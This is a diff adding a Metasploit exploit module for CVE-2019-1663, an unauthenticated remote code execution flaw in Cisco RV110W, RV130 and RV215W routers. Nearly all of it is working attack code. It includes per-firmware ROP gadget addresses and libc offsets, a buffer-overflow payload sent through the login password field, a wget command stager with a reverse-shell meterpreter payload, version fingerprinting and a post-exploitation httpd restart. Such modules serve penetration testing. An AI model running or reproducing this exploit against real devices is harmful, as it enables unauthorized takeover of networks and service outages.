@@ -1,0 +1,423 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+# linux/armle/meterpreter/bind_tcp -> segfault
+# linux/armle/meterpreter/reverse_tcp -> segfault
+# linux/armle/meterpreter_reverse_http -> works
+# linux/armle/meterpreter_reverse_https -> works
+# linux/armle/meterpreter_reverse_tcp -> works
+# linux/armle/shell/bind_tcp -> segfault
+# linux/armle/shell/reverse_tcp -> segfault
+# linux/armle/shell_bind_tcp -> segfault
+# linux/armle/shell_reverse_tcp -> segfault
+#
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GoodRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Deprecated
+
+  moved_from 'exploit/linux/http/cisco_rv130_rmi_rce'
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Cisco RV110W/RV130(W)/RV215W Routers Management Interface Remote Command Execution',
+      'Description'    => %q{
+        A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall,
+        Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router
+        could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.
+
+        The vulnerability is due to improper validation of user-supplied data in the web-based management interface.
+        An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.
+
+        A successful exploit could allow the attacker to execute arbitrary code on the underlying operating
+        system of the affected device as a high-privilege user.
+
+        RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected.
+        RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.
+        RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected.
+
+        Note: successful exploitation may not result in a session, and as such,
+         on_new_session will never repair the HTTP server, leading to a denial-of-service condition.
+      },
+      'Author'         =>
+        [
+          'Yu Zhang', # Initial discovery (GeekPwn conference)
+          'Haoliang Lu', # Initial discovery (GeekPwn conference)
+          'T. Shiomitsu', # Initial discovery (Pen Test Partners)
+          'Quentin Kaiser <kaiserquentin@gmail.com>' # Vulnerability analysis & exploit dev
+        ],
+      'License'         => MSF_LICENSE,
+      'Platform'        =>  %w[linux],
+      'Arch'            =>  [ARCH_ARMLE, ARCH_MIPSLE],
+      'SessionTypes'    =>  %w[meterpreter],
+      'CmdStagerFlavor' => %w{ wget },
+      'Privileged'      => true, # BusyBox
+      'References'      =>
+        [
+          ['CVE', '2019-1663'],
+          ['BID', '107185'],
+          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-cmd-ex'],
+          ['URL', 'https://www.pentestpartners.com/security-blog/cisco-rv130-its-2019-but-yet-strcpy/']
+        ],
+      'DefaultOptions' => {
+          'WfsDelay' => 10,
+          'SSL' => true,
+          'RPORT' => 443,
+          'CMDSTAGER::FLAVOR' => 'wget',
+          'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',
+       },
+      'Targets'        =>
+        [
+          [ 'Cisco RV110W 1.1.0.9',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af06000,
+              'libcrypto_base_addr' => 0x2ac01000,
+              'system_offset'       => 0x00050d40,
+              'got_offset'          => 0x0009d560,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x00167c8c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV110W 1.2.0.9',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af08000,
+              'libcrypto_base_addr' => 0x2ac03000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x00098db0,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x00167c4c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV110W 1.2.0.10',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af09000,
+              'libcrypto_base_addr' => 0x2ac04000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x00098db0,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x00151fbc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV110W 1.2.1.4',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af54000,
+              'libcrypto_base_addr' => 0x2ac4f000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x00098db0,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV110W 1.2.1.7',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af98000,
+              'libcrypto_base_addr' => 0x2ac4f000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x00098db0,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x0003e7dc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV130/RV130W < 1.0.3.45',
+            {
+              'offset'          => 446,
+              'libc_base_addr'  => 0x357fb000,
+              'system_offset'   => 0x0004d144,
+              'gadget1'         => 0x00020e79, # pop {r2, r6, pc};
+              'gadget2'         => 0x00041308, # mov r0, sp; blx r2;
+              'Arch'            => ARCH_ARMLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/armle/meterpreter_reverse_tcp',
+              }
+            },
+          ],
+          [ 'Cisco RV215W 1.1.0.5',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af59000,
+              'libcrypto_base_addr' => 0x2ac54000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x00098db0,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV215W 1.1.0.6',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af59000,
+              'libcrypto_base_addr' => 0x2ac54000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x00098db0,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x00151fbc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV215W 1.2.0.14',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af5f000,
+              'libcrypto_base_addr' => 0x2ac5a001,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x00098db0,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV215W 1.2.0.15',
+            {
+              'offset'              => 69,
+              'libc_base_addr'      => 0x2af5f000,
+              'libcrypto_base_addr' => 0x2ac5a000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x00098db0,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV215W 1.3.0.7',
+            {
+              'offset'              => 77,
+              'libc_base_addr'      => 0x2afeb000,
+              'libcrypto_base_addr' => 0x2aca5000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x000a0530,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x00057bec, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+          [ 'Cisco RV215W 1.3.0.8',
+            {
+              'offset'              => 77,
+              'libc_base_addr'      => 0x2afee000,
+              'libcrypto_base_addr' => 0x2aca5000,
+              'system_offset'       => 0x0004c7e0,
+              'got_offset'          => 0x000a0530,
+              # gadget 1 is in /usr/lib/libcrypto.so
+              'gadget1'             => 0x0003e7dc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
+              'Arch'                => ARCH_MIPSLE,
+              'DefaultOptions'  => {
+                'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
+              }
+            }
+          ],
+        ],
+      'DisclosureDate'  => 'Feb 27 2019',
+      'DefaultTarget'   => 0,
+      'Notes' => {
+        'Stability'   => [ CRASH_SERVICE_DOWN, ],
+      },
+    ))
+  end
+
+  def p(lib, offset)
+    [(lib + offset).to_s(16)].pack('H*').reverse
+  end
+
+  def prepare_shellcode(cmd)
+    case target
+    # RV110W 1.1.0.9, 1.2.0.9, 1.2.0.10, 1.2.1.4, 1.2.1.7
+    # RV215W 1.1.0.5, 1.1.0.6, 1.2.0.14, 1.2.0.15, 1.3.0.7, 1.3.0.8
+    when targets[0], targets[1], targets[2], targets[3], targets[4], targets[6], targets[7], targets[8], targets[9], targets[10], targets[11]
+      shellcode = rand_text_alpha(target['offset']) +           # filler
+        rand_text_alpha(4) +                                    # $s0
+        rand_text_alpha(4) +                                    # $s1
+        rand_text_alpha(4) +                                    # $s2
+        rand_text_alpha(4) +                                    # $s3
+        p(target['libc_base_addr'], target['system_offset']) +  # $s4
+        rand_text_alpha(4) +                                    # $s5
+        rand_text_alpha(4) +                                    # $s6
+        rand_text_alpha(4) +                                    # $s7
+        rand_text_alpha(4) +                                    # $s8
+        p(target['libcrypto_base_addr'], target['gadget1']) +   # $ra
+        p(target['libc_base_addr'], target['got_offset']) +
+        rand_text_alpha(28) +
+        cmd
+      shellcode
+    when targets[5] # RV130/RV130W
+      shellcode = rand_text_alpha(target['offset']) +           # filler
+        p(target['libc_base_addr'], target['gadget1']) +
+        p(target['libc_base_addr'], target['system_offset']) +  # r2
+        rand_text_alpha(4) +                                    # r6
+        p(target['libc_base_addr'], target['gadget2']) +        # pc
+        cmd
+      shellcode
+    end
+  end
+
+  def send_request(buffer)
+    begin
+      send_request_cgi({
+        'uri'     => '/login.cgi',
+        'method'  => 'POST',
+        'vars_post' => {
+              "submit_button": "login",
+              "submit_type": "",
+              "gui_action": "",
+              "wait_time": 0,
+              "change_action": "",
+              "enc": 1,
+              "user": rand_text_alpha_lower(5),
+              "pwd": buffer,
+              "sel_lang": "EN"
+          }
+      })
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the router")
+    end
+  end
+
+  def check
+
+    # We fingerprint devices using SHA1 hash of a web resource accessible to unauthenticated users.
+    # We use lang_pack/EN.js because it's the one file that changes the most between versions.
+    # Note that it's not a smoking gun given that some branches keep the exact same files in /www
+    # (see RV110 branch 1.2.1.x/1.2.2.x, RV130 > 1.0.3.22, RV215 1.2.0.x/1.3.x)
+
+    fingerprints = {
+      "69d906ddd59eb6755a7b9c4f46ea11cdaa47c706" => {
+        "version" => "Cisco RV110W 1.1.0.9",
+        "status" =>Exploit::CheckCode::Vulnerable
+      },
+      "8d3b677d870425198f7fae94d6cfe262551aa8bd" => {
+        "version" => "Cisco RV110W 1.2.0.9",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "134ee643ec877641030211193a43cc5e93c96a06" => {
+        "version" => "Cisco RV110W 1.2.0.10",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "e3b2ec9d099a3e3468f8437e5247723643ff830e" => {
+        "version" => "Cisco RV110W 1.2.1.4, 1.2.1.7, 1.2.2.1 (not vulnerable), 1.2.2.4 (not vulnerable)",
+        "status" => Exploit::CheckCode::Unknown
+      },
+      "6b7b1e8097e8dda26db27a09b8176b9c32b349b3" => {
+        "version" => "Cisco RV130/RV130W 1.0.0.21",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "9b1a87b752d11c5ba97dd80d6bae415532615266" => {
+        "version" => "Cisco RV130/RV130W 1.0.1.3",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "9b6399842ef69cf94409b65c4c61017c862b9d09" => {
+        "version" => "Cisco RV130/RV130W 1.0.2.7",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "8680ec6df4f8937acd3505a4dd36d40cb02c2bd6" => {
+        "version" => "Cisco RV130/RV130W 1.0.3.14, 1.0.3.16",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "8c8e05de96810a02344d96588c09b21c491ede2d" => {
+        "version" => "Cisco RV130/RV130W 1.0.3.22, 1.0.3.28, 1.0.3.44, 1.0.3.45 (not vulnerable), 1.0.3.51 (not vulnerable)",
+        "status" => Exploit::CheckCode::Unknown
+      },
+      "2f29a0dfa78063d643eb17388e27d3f804ff6765" => {
+        "version" => "Cisco RV215W 1.1.0.5",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "e5cc84d7c9c2d840af85d5f25cee33baffe3ca6f" => {
+        "version" => "Cisco RV215W 1.1.0.6",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "7cc8fcce5949a68c31641c38255e7f6ed31ff4db" => {
+        "version" => "Cisco RV215W 1.2.0.14 or 1.2.0.15",
+        "status" => Exploit::CheckCode::Vulnerable
+      },
+      "050d47ea944eaeadaec08945741e8e380f796741" => {
+        "version" => "Cisco RV215W 1.3.0.7 or 1.3.0.8, 1.3.1.1 (not vulnerable), 1.3.1.4 (not vulnerable)",
+        "status" => Exploit::CheckCode::Unknown
+      }
+    }
+
+    uri = target_uri.path
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(uri, 'lang_pack/EN.js')
+    })
+    if res && res.code == 200
+      fingerprint = Digest::SHA1.hexdigest("#{res.body.to_s}")
+      if fingerprints.key?(fingerprint)
+        print_good("Successfully identified device: #{fingerprints[fingerprint]["version"]}")
+        return fingerprints[fingerprint]["status"]
+      else
+        print_status("Couldn't reliably fingerprint the target.")
+      end
+    end
+    Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    print_status('Sending request')
+    execute_cmdstager
+  end
+
+  def execute_command(cmd, opts = {})
+    shellcode = prepare_shellcode(cmd.to_s)
+    send_request(shellcode)
+  end
+
+  def on_new_session(session)
+    # Given there is no process continuation here, the httpd server will stop
+    # functioning properly and we need to take care of proper restart
+    # ourselves.
+    print_status("Reloading httpd service")
+    reload_httpd_service = "killall httpd && cd /www && httpd && httpd -S"
+    if session.type.to_s.eql? 'meterpreter'
+      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
+      session.sys.process.execute '/bin/sh', "-c \"#{reload_httpd_service}\""
+    else
+      session.shell_command(reload_httpd_service)
+    end
+  ensure
+    super
+  end
+end
